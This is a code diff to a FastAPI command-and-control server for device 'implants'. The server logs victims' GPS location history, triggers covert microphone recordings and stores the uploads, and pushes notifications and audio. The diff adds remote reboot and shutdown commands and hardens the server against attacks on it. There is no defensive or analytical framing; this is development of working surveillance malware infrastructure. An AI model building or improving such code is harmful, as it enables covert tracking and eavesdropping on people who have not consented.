@@ -64,7 +64,17 @@ def init_db():
     try:
         c.execute("ALTER TABLE devices ADD COLUMN play_audio INTEGER DEFAULT 0")
     except sqlite3.OperationalError:
-        pass # Column already exists
+        pass
+    
+    try:
+        c.execute("ALTER TABLE devices ADD COLUMN reboot_cmd INTEGER DEFAULT 0")
+    except sqlite3.OperationalError:
+        pass
+        
+    try:
+        c.execute("ALTER TABLE devices ADD COLUMN shutdown_cmd INTEGER DEFAULT 0")
+    except sqlite3.OperationalError:
+        pass
     
     c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_id ON history(device_id)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_history_unix_time ON history(unix_time)")
@@ -72,18 +82,18 @@ def init_db():
     conn.commit()
     conn.close()
 
+# Global connection pool
+global_db_conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+global_db_conn.row_factory = sqlite3.Row
+global_db_conn.execute("PRAGMA journal_mode=WAL;")
+
 def get_db():
-    """Context dependency generator supplying standalone thread-safe DB pools per request."""
-    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
-    conn.row_factory = sqlite3.Row
-    conn.execute("PRAGMA journal_mode=WAL;")
-    try:
-        yield conn
-    finally:
-        conn.close()
+    """Returns the persistent thread-safe DB connection instead of creating a new one per request."""
+    return global_db_conn
 
 LAST_CLEANUP = 0
 CLEANUP_INTERVAL = 86400  # Run cleanup at most once per day
+REQUEST_COUNTER = 0
 
 def run_auto_cleanup(db: sqlite3.Connection):
     global LAST_CLEANUP
@@ -123,7 +133,7 @@ app = FastAPI(lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
-    allow_credentials=True,
+    allow_credentials=False, # HARDENED: Browsers reject wildcard origins combined with true credentials
     allow_methods=["*"],
     allow_headers=["*"],
 )
@@ -143,7 +153,7 @@ async def api_login(username: str = Form(...), password: str = Form(...)):
     hashed_input = hashlib.sha256(password.encode()).hexdigest()
     if username == ADMIN_USERNAME and secrets.compare_digest(hashed_input, ADMIN_PASSWORD_HASH):
         response = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
-        response.set_cookie(key="session_token", value=ADMIN_PASSWORD_HASH, httponly=True)
+        response.set_cookie(key="session_token", value=ADMIN_PASSWORD_HASH, httponly=True, samesite="strict")
         return response
     return HTMLResponse("<p style='color:red; text-align:center; margin-top:50px;'>Authentication failure. Invalid Key Ring.</p>", status_code=401)
 
@@ -176,7 +186,10 @@ async def receive_report(
     lon: float = Form(...),
     db: sqlite3.Connection = Depends(get_db)
 ):
-    run_auto_cleanup(db)
+    global REQUEST_COUNTER
+    REQUEST_COUNTER += 1
+    if REQUEST_COUNTER % 100 == 0:
+        run_auto_cleanup(db)
     
     if not secrets.compare_digest(implant_key, IMPLANT_KEY):
         return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
@@ -185,7 +198,7 @@ async def receive_report(
     now_unix = time.time()
     
     c = db.cursor()
-    c.execute("SELECT ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio FROM devices WHERE device_id = ?", (device_id,))
+    c.execute("SELECT ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd FROM devices WHERE device_id = ?", (device_id,))
     row = c.fetchone()
     
     if row:
@@ -195,6 +208,8 @@ async def receive_report(
         notif_state = row["notif_state"]
         notif_text = row["notif_text"]
         play_audio = row["play_audio"]
+        reboot_cmd = row["reboot_cmd"]
+        shutdown_cmd = row["shutdown_cmd"]
         
         c.execute("""
             UPDATE devices 
@@ -208,10 +223,16 @@ async def receive_report(
         notif_state = 0
         notif_text = ""
         play_audio = 0
+        reboot_cmd = 0
+        shutdown_cmd = 0
         c.execute("""
-            INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        """, (device_id, level, lat, lon, current_time_str, now_unix, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio))
+            INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (device_id, level, lat, lon, current_time_str, now_unix, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd))
+        
+    # Reset one-time power commands after they are successfully fetched by the implant
+    if reboot_cmd == 1 or shutdown_cmd == 1:
+        c.execute("UPDATE devices SET reboot_cmd = 0, shutdown_cmd = 0 WHERE device_id = ?", (device_id,))
         
     c.execute("""
         INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
@@ -226,7 +247,9 @@ async def receive_report(
         "record_audio": record_audio,
         "notification_command": notif_state,
         "notification_text": notif_text,
-        "play_audio": play_audio
+        "play_audio": play_audio,
+        "reboot_cmd": reboot_cmd,
+        "shutdown_cmd": shutdown_cmd
     }
 
 @app.get("/devices")
@@ -262,7 +285,7 @@ async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = D
         if len(points) == 2:
             dist = haversine(points[1]["lat"], points[1]["lon"], points[0]["lat"], points[0]["lon"])
             time_diff = abs(points[0]["unix_time"] - points[1]["unix_time"])
-            if time_diff > 0 and (dist / time_diff) > 0.3:
+            if time_diff > 0 and (dist / time_diff) > 1.5:  # 1.5m/s (walking pace) ignores GPS drift
                 activity_state = "Moving"
                 
         c.execute("SELECT unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 1", (device_id,))
@@ -296,22 +319,40 @@ async def get_history_detailed(
     request: Request,
     start_time: Optional[float] = None, 
     end_time: Optional[float] = None,
+    page: int = 1,
+    per_page: int = 500,
     db: sqlite3.Connection = Depends(get_db)
 ):
     verify_session(request)
     c = db.cursor()
+    offset = (page - 1) * per_page
     if start_time and end_time:
         c.execute("""
             SELECT lat, lon, level, timestamp, unix_time 
             FROM history 
             WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? 
             ORDER BY id DESC
-        """, (device_id, start_time, end_time))
+            LIMIT ? OFFSET ?
+        """, (device_id, start_time, end_time, per_page, offset))
     else:
-        c.execute("SELECT lat, lon, level, timestamp, unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 100", (device_id,))
+        c.execute("SELECT lat, lon, level, timestamp, unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
         
     rows = c.fetchall()
-    return {"history": [{"lat": r["lat"], "lon": r["lon"], "level": r["level"], "time": r["timestamp"], "unix_time": r["unix_time"]} for r in rows]}
+    
+    # Get total count for pagination
+    if start_time and end_time:
+        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?", (device_id, start_time, end_time))
+    else:
+        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ?", (device_id,))
+    total = c.fetchone()[0]
+    
+    return {
+        "history": [{"lat": r["lat"], "lon": r["lon"], "level": r["level"], "time": r["timestamp"], "unix_time": r["unix_time"]} for r in rows],
+        "total": total,
+        "page": page,
+        "per_page": per_page,
+        "total_pages": math.ceil(total / per_page) if total > 0 else 1
+    }
 
 @app.post("/set_ping")
 async def set_ping(device_id: str = Form(...), seconds: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
@@ -348,6 +389,16 @@ async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(
     db.commit()
     return {"status": "success"}
 
+@app.post("/set_power_cmd")
+async def set_power_cmd(device_id: str = Form(...), action: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+    c = db.cursor()
+    if action == "reboot":
+        c.execute("UPDATE devices SET reboot_cmd = 1 WHERE device_id = ?", (device_id,))
+    elif action == "shutdown":
+        c.execute("UPDATE devices SET shutdown_cmd = 1 WHERE device_id = ?", (device_id,))
+    db.commit()
+    return {"status": "success"}
+
 @app.get("/logout")
 async def logout():
     response = RedirectResponse(url="/login", status_code=status.HTTP_303_SEE_OTHER)
@@ -373,15 +424,20 @@ async def upload_audio(
     if not secrets.compare_digest(implant_key, IMPLANT_KEY):
         return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
         
+    # HARDENED: Prevent relative path traversal exploits (e.g. device_id = "../../../etc")
+    safe_device_id = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip()
+    if not safe_device_id:
+        safe_device_id = "unknown"
+        
     c = db.cursor()
 
     if error == "busy":
-        filename = f"static/audio/{device_id}_{int(time.time())}_BUSY.txt"
+        filename = f"static/audio/{safe_device_id}_{int(time.time())}_BUSY.txt"
         with open(filename, "w") as f:
             f.write("Microphone was busy by another app - 0.0s recorded")
         c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
     elif file:
-        filename = f"static/audio/{device_id}_{int(time.time())}.wav"
+        filename = f"static/audio/{safe_device_id}_{int(time.time())}.wav"
         with open(filename, "wb") as buffer:
             shutil.copyfileobj(file.file, buffer)
         c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
